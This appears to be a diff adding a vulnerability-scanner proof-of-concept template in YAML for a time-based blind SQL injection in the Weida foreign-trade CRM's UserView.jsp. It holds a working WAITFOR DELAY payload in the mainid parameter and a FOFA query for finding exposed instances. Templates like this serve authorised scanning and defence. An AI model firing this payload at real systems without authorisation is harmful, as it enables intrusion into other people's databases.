@@ -1,0 +1,17 @@
+id: poc-yaml-weidasoft-userview-jsp-sqli
+info:
+  name: 维达外贸客户关系管理系统 UserView.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 维达外贸客户关系管理系统
+  fofa: title="维达外贸客户关系管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /wap/common/admin/UserView.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--
+  expression: status_code == 200 && contains(gbk_decode(body),"限制远程") && contains(gbk_decode(body),"限制多重")
+    && contains(gbk_decode(body),"限制随机") && duration > t1 && duration < t2
+transport: http
